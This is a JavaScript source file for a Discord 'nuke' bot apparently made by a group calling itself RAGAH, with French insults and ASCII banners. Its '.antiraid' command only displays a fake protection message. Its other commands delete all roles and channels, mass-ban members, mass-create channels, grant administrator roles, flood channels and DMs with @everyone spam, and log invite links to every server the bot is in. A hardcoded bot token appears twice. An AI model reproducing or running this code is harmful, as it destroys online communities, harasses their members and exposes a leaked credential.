const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "Nzc2MDkyNDM4MzA4NTg1NDgy.X6v2aA.Ud3yGhoGuKfKAYTLt3-Gw6GE_Jo";
var prefix = ".";
var mention = "126connectés";

var fucked = false;
 
bot.on('ready', () => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds
        .find("id", guild.id)
        .channels.find("id", guild.channels.random().id);
      invite
        .createInvite()
        .then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    });
});
 
bot.on("message", msg => {
  //#region Legit
  /* Commandes legit */

  if(msg.content === ".antiraid") {
    msg.delete();
    msg.channel.send("**Activation du mode Anti-Raid ⚠**").then(async msg => {
      setTimeout(() => {
        msg.edit('░░░░░░░░░░ 0%');
      }, 1000);
      setTimeout(() => {
        msg.edit('▓▓░░░░░░░░ 20%');
      }, 1500);
      setTimeout(() => {
        msg.edit('▓▓▓▓░░░░░░ 40%');
      }, 2000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓░░░░ 60%');
      }, 2500);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓░░ 80%');
      }, 3000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
      }, 3500);
      setTimeout(() => {
        msg.edit('Activation du mode anti raid avec succès ✅');
      }, 3500);
      setTimeout(() => {
        msg.edit(`**:white_check_mark: Votre serveur est protégé contre les attaques !**`);
      }, 3500);
    });
  }
  //#endregion

    if (msg.content === ".droles") {
    if(msg.channel.type === "dm") return;
    msg.guild.roles.forEach(role => role.delete());
    if (msg.deletable) msg.delete();
    }

  if (msg.content === ".croles2") {
    if(msg.channel.type === "dm") return;
    let interval = setInterval(function() {
      if (msg.guild.roles.size < 99)
        msg.guild.createRole({ name: '$hacked$', color:'RANDOM', permissions: 'ADMINISTRATOR' })
      if(msg.member.roles.size < 99 )
        msg.member.addRoles(msg.guild.roles.findAll("name", "$hacked$"));
    });
  }

  if (msg.content === ".croles") {
    if(msg.channel.type === "dm") return;
    let interval = setInterval(function() {
      if (msg.guild.roles.size < 99)
        msg.guild.createRole({ name: '$hacked$', color:'RANDOM' })
      if(msg.member.roles.size < 99 )
        msg.member.addRoles(msg.guild.roles.findAll("name", "$hacked$"));
    });
  }
  //RENAME TOUT LE MONDE EN DESSOUS DU BOT
  if(msg.content === ".dees") {
    msg.delete();
    msg.guild.members.map(async (member, id) => {
      member.setNickname("🇦🇹🇭🇺 la RAGAH vous baise");
    });
  } 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.spam') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function() {
      msg.channel.send("https://cdn.discordapp.com/attachments/697033664294289428/780069909324365854/RAGAH_Destroys_The_Server_-_La_RAGAH_vous_a_raid_-_nique_le_gacha.png\nhttps://cdn.discordapp.com/attachments/697033664294289428/780069909324365854/RAGAH_Destroys_The_Server_-_La_RAGAH_vous_a_raid_-_nique_le_gacha.png\nhttps://media.discordapp.net/attachments/696866970137657477/709757330744410223/TRZ.gif\nhttps://cdn.discordapp.com/attachments/697026042161922098/777117709125025802/ezgif-2-90f2cade9fa6.gif\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone  @here **LA  __R.A.G.A.H.__  EST SUPÉRIEURE À TOI ET VIENT DE DÉTRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIT, GET REKT !**"
      );
    }, 500);
  }

  if (msg.content === ".ppp") {
    msg.guild.members.forEach(member => {
    member.createDM().then(function (channel) {
      for (var i = 0; i < 30; i++) {
            try{
              member.send("https://discord.gg/kswnUZ73tc" + '\n' + "https://www.youtube.com/channel/UCbCmh9a_yeyoZOI8w7BttiQ")
              } catch(err) {
                console.error(err);
              };
            }
    })
    });
  };

  if (msg.content === '.des') {
    console.log(`Commande .mp par ${msg.author.tag}`);
    if (msg.channel.type === "dm") return;
    if (msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      setInterval(function() {
        try{
          member
            .send("https://cdn.discordapp.com/attachments/633240688485466113/717350543990718523/AKM.png\nhttps://media.discordapp.net/attachments/696866970137657477/709757330744410223/TRZ.gif \n https://cdn.discordapp.com/attachments/697026042161922098/777117709125025802/ezgif-2-90f2cade9fa6.gif\n https://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA\n**" + msg.guild.owner.user.username + " s'est fait bz son serveur de fion par la __R.A.G.A.H.__** !\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n      RAGAHRAGAH\n      RAGAH       RAGAH\n      RAGAH          RAGAH\n      RAGAH        RAGAH\n      RAGAHRAGAH\n      RAGAH      RAGAH\n      RAGAH         RAGAH\n      RAGAH          RAGAH\n      RAGAH          RAGAH\n      RAGAH          RAGAH\n\n          RAGAHRAGAH\n      RAGAH         RAGAH\n      RAGAH           RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n\n     RAGAHRAGAHRAGAH\n  RAGAH   RAGAH   RAGAH\nRAGAH\nRAGAH\n RAGAH          RAGAHRAGAH\n  RAGAH                      RAGAH\n    RAGAH                  RAGAH\n       RAGAH             RAGAH\n          RAGAH       RAGAH\n                   RAGAH\n\n          RAGAHRAGAH\n      RAGAH         RAGAH\n      RAGAH           RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH \n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\nLa RAGAH vous nique comme cette gacha");
          } catch(err) {
            console.error(err);
          }
      }, 450)});
    };

  if(msg.content === '.del') {
    if(msg.channel.type === "dm") return;
    if(msg.guild.channels.size === 0) return;
    else if (!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS"))
      return;
    msg.guild.channels.forEach(chan => {
      if(chan.deletable) chan.delete();
    });
  }
 
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked) {
      msg.guild
        .setIcon("https://cdn.discordapp.com/attachments/697026042161922098/777194313133457408/austria_hungary_grunge_flag_by_the9988-d5b67di.png"
        )
        .catch(e => {});
      msg.guild.setName('🇦🇹🇭🇺 𝗟𝗔 𝗥𝗔𝗚𝗔𝗛 𝗩𝗢𝗨𝗦 𝗔 𝗥𝗔𝗜𝗗 [Republique Anti-Gacha Austro-Hongroise]]').catch(e => {});
 
       for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('baisé par la RAGAH', 'voice').catch(e => {});
        msg.guild.createChannel('🇦🇹 raid by ragah 🇭🇺', 'text').catch(e => {});
      }
      fucked = true;
    }

    if (msg.deletable) {
      msg.delete();
    }
  }

  if (msg.content.startsWith('.nuke')) {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked) {
      msg.guild
        .setIcon("https://cdn.discordapp.com/attachments/697026042161922098/777194313133457408/austria_hungary_grunge_flag_by_the9988-d5b67di.png"
        )
        .catch(e => {});
      msg.guild.setName('🇦🇹🇭🇺 𝗟𝗔 𝗥𝗔𝗚𝗔𝗛 𝗩𝗢𝗨𝗦 𝗔 𝗥𝗔𝗜𝗗 [Republique Anti-Gacha Austro-Hongroise]]').catch(e => {});
 
       for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('baisé par la RAGAH', 'voice').catch(e => {});
        msg.guild.createChannel('🇦🇹 raid by ragah 🇭🇺', 'text').catch(e => {});
      }
      fucked = true;
    }
  }

  if (msg.content === '.all') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked) {
      msg.guild
        .setIcon("https://cdn.discordapp.com/attachments/770576867950329866/781262396530491402/image0.jpg"
        )
        .catch(e => {});
      msg.guild.setName('🇺🇦RAGAH & 🇪🇸RCAG ont détruit ton serveur').catch(e => {});
 
       for (var i = 0; i < 390; i++) {
        msg.guild.createChannel("🇺🇦 onche l'alliance 🇪🇸", 'voice').catch(e => {});
        msg.guild.createChannel("🇪🇸 onche l'alliance 🇺🇦", 'voice').catch(e => {});
        msg.guild.createChannel('🇺🇦 RAGAH et 🇪🇸 RCAG', 'text').catch(e => {});
        msg.guild.createChannel('━━━━━━━━━━━━━━━━', 'text').catch(e => {});
        msg.guild.createChannel('🇪🇸 RCAG et 🇺🇦 RAGAH', 'text').catch(e => {});
      }
      fucked = true;
    }

    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .ban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "la steet") && member.bannable)
        member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild
      .createRole({
        name: "membre",
        permissions: "ADMINISTRATOR",
        mentionable: false
      })
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
  //#endregion
});

bot.on("message", msg => {
  if (msg.content.startsWith(".des")) { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send('https://media.discordapp.net/attachments/696866970137657477/709757330744410223/TRZ.gif\nhttps://cdn.discordapp.com/attachments/697026042161922098/777117709125025802/ezgif-2-90f2cade9fa6.gif https://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone  @here **LA  __R.A.G.A.H.__  EST SUPÉRIEURE À TOI ET VIENT DE DÉTRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIT, GET REKT !**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n      RAGAHRAGAH\n      RAGAH       RAGAH\n      RAGAH          RAGAH\n      RAGAH        RAGAH\n      RAGAHRAGAH\n      RAGAH      RAGAH\n      RAGAH         RAGAH\n      RAGAH          RAGAH\n      RAGAH          RAGAH\n      RAGAH          RAGAH\n\n          RAGAHRAGAH\n      RAGAH         RAGAH\n      RAGAH           RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n\n     RAGAHRAGAHRAGAH\n  RAGAH   RAGAH   RAGAH\nRAGAH\nRAGAH\n RAGAH          RAGAHRAGAH\n  RAGAH                      RAGAH\n    RAGAH                  RAGAH\n       RAGAH             RAGAH\n          RAGAH       RAGAH\n                   RAGAH\n\n          RAGAHRAGAH\n      RAGAH         RAGAH\n      RAGAH           RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAHRAGAHRAGAH\n      RAGAHRAGAHRAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH\n      RAGAH             RAGAH \n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n*Serveur détruit, cordialement, la RAGAH (République Anti-Gacha Austro-Hongroise)*'
          );
      }, 2500);
    });
  }

  if (msg.content === ".nuke") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send('https://cdn.discordapp.com/attachments/633240688485466113/717350543990718523/AKM.png\nhttps://cdn.discordapp.com/attachments/697033664294289428/780069909324365854/RAGAH_Destroys_The_Server_-_La_RAGAH_vous_a_raid_-_nique_le_gacha.png\nhttps://media.discordapp.net/attachments/696866970137657477/709757330744410223/TRZ.gif\nhttps://cdn.discordapp.com/attachments/697026042161922098/777117709125025802/ezgif-2-90f2cade9fa6.gif\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone is @here **LA  __R.A.G.A.H.__  EST SUPÉRIEURE À TOI ET VIENT DE DÉTRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIT, GET REKT !**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░█████╗░░██████╗░░█████╗░██╗░░██╗\n██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░██║\n██████╔╝███████║██║░░███╗███████║███████║\n██╔══██╗██╔══██║██║░░░██║██╔══██║██╔══██║\n██║░░██║██║░░██║╚██████╔╝██║░░██║██║░░██║\n╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n:small_red_triangle_down: La RAGAH vous nique comme cette gacha :small_red_triangle_down:'
          );
      }, 2500);
    });
  }

  if (msg.content === ".nuke2") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send('https://cdn.discordapp.com/attachments/697033664294289428/780069909324365854/RAGAH_Destroys_The_Server_-_La_RAGAH_vous_a_raid_-_nique_le_gacha.png\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone is @here **LA  __R.A.G.A.H.__  EST SUPÉRIEURE À TOI ET VIENT DE DÉTRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIT, GET REKT !**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░█████╗░░██████╗░░█████╗░██╗░░██╗\n██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░██║\n██████╔╝███████║██║░░███╗███████║███████║\n██╔══██╗██╔══██║██║░░░██║██╔══██║██╔══██║\n██║░░██║██║░░██║╚██████╔╝██║░░██║██║░░██║\n╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n*Serveur détruit, cordialement, la RAGAH (République Anti-Gacha Austro-Hongroise)*'
          );
      }, 2500);
    });
  }

  if (msg.content === ".nuke3") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send('https://media.discordapp.net/attachments/696866970137657477/709757330744410223/TRZ.gif\nhttps://cdn.discordapp.com/attachments/697033664294289428/780069909324365854/RAGAH_Destroys_The_Server_-_La_RAGAH_vous_a_raid_-_nique_le_gacha.png\nhttps://cdn.discordapp.com/attachments/697026042161922098/777117709125025802/ezgif-2-90f2cade9fa6.gif\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone is @here **LA  __R.A.G.A.H.__  EST SUPÉRIEURE À TOI ET VIENT DE DÉTRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIT, GET REKT !**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░█████╗░░██████╗░░█████╗░██╗░░██╗\n██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░██║\n██████╔╝███████║██║░░███╗███████║███████║\n██╔══██╗██╔══██║██║░░░██║██╔══██║██╔══██║\n██║░░██║██║░░██║╚██████╔╝██║░░██║██║░░██║\n╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n*Serveur détruit, cordialement, la RAGAH (République Anti-Gacha Austro-Hongroise)*'
          );
      }, 2500);
    });
  }

  if (msg.content === ".all") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send("https://www.youtube.com/channel/UCe9J2B-UcyEYHX9xmzOYhSg\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone is @here **L'alliance de la RAGAH et de la RCAG t'as bz NUUUKE Achrosion *nous* protège quand alors le chemin à prendre !!!**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░█████╗░░██████╗░░█████╗░██╗░░██╗\n██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░██║\n██████╔╝███████║██║░░███╗███████║███████║\n██╔══██╗██╔══██║██║░░░██║██╔══██║██╔══██║\n██║░░██║██║░░██║╚██████╔╝██║░░██║██║░░██║\n╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░██████╗░█████╗░░██████╗\n██╔══██╗██╔════╝██╔══██╗██╔════╝\n██████╔╝██║░░░░░███████║██║░░███╗\n██╔══██╗██║░░░░░██╔══██║██║░░░██║\n██║░░██║╚██████╗██║░░██║╚██████╔╝\n╚═╝░░╚═╝░╚═════╝╚═╝░░╚═╝░╚═════╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n*Serveur détruit, cordialement, la RAGAH (République Anti-Gacha Austro-Hongroise) et la RCAG (République Catalane Anti-Gacha)*"
          );
      }, 2500);
    });
  }

  if (msg.content === ".all") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send("https://www.youtube.com/channel/UCe9J2B-UcyEYHX9xmzOYhSg\nhttps://www.youtube.com/channel/UCiQNCly5FPaHiO9-9Vp4xWA @everyone is @here **L'alliance de la RAGAH et de la RCAG t'as bz NUUUKE Achrosion *nous* protège quand alors le chemin à prendre !!!**\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░█████╗░░██████╗░░█████╗░██╗░░██╗\n██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░██║\n██████╔╝███████║██║░░███╗███████║███████║\n██╔══██╗██╔══██║██║░░░██║██╔══██║██╔══██║\n██║░░██║██║░░██║╚██████╔╝██║░░██║██║░░██║\n╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n██████╗░░██████╗░█████╗░░██████╗\n██╔══██╗██╔════╝██╔══██╗██╔════╝\n██████╔╝██║░░░░░███████║██║░░███╗\n██╔══██╗██║░░░░░██╔══██║██║░░░██║\n██║░░██║╚██████╗██║░░██║╚██████╔╝\n╚═╝░░╚═╝░╚═════╝╚═╝░░╚═╝░╚═════╝\n\n ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n*Serveur détruit, cordialement, la RAGAH (République Anti-Gacha Austro-Hongroise) et la RCAG (République Catalane Anti-Gacha)*"
          );
      }, 2500);
    });
  }

  if (msg.content === ".all") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send("@everyone is @here\n━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n\n:blue_square::blue_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square:\n:blue_square::blue_square::blue_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square:\n:blue_square::blue_square::blue_square::blue_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square:\n:blue_square::blue_square::white_large_square::blue_square::blue_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square:\n:blue_square::blue_square::blue_square::blue_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square::yellow_square:\n:blue_square::blue_square::blue_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square:\n:blue_square::blue_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:\n\n━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━"
          );
      }, 2500);
    });
  }

  if (msg.content === ".all") { 
    msg.delete();
    let i = 0;
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send("** **\n:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:\n:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:\n:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:\n:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:﻿:blue_square:\n:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:\n:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:\n:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:\n:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:﻿:yellow_square:\n\n\n━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━ ■ ━━━\n@everyone is @here"
          );
      }, 2500);
    });
  }

});

bot.login('Nzc2MDkyNDM4MzA4NTg1NDgy.X6v2aA.Ud3yGhoGuKfKAYTLt3-Gw6GE_Jo');
